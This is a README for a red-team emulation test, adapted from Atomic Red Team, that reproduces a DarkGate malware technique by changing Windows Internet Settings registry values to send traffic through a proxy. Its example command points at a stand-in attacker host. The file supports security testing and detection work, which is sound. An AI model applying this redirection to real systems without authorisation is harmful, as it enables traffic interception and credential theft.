# Set-Up Proxy Server

## Description
Configures proxy server settings through registry modification to redirect network traffic. Observed in DarkGate malware. Routes internet traffic through malicious proxy servers, enabling man-in-the-middle attacks, credential capture, and C2 communications through legitimate-appearing proxy traffic.

Adapted from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)

## Arguments
- **proxy_server**: Proxy server to be set up (default: `proxy.atomic-test.com:8080`)
- **backup_location**: Path where registry backup will be saved (default: `C:\Users\Public\backup.reg`)

## Example(s)
You can run this TTP with the following command:
```bash
ttpforge run forgearmory//utils/configure-proxy-server/ttp.yaml \
  --proxy_server "malicious-proxy.attacker.com:8080"
```

## Steps
1. **backup_registry**: Exports the current Internet Settings registry configuration to a backup file for restoration during cleanup.
2. **setup_proxy_server**: Modifies the Internet Settings registry to enable proxy usage by setting ProxyEnable to 1 (DWORD) and sets the ProxyServer value to the specified proxy server address and port.
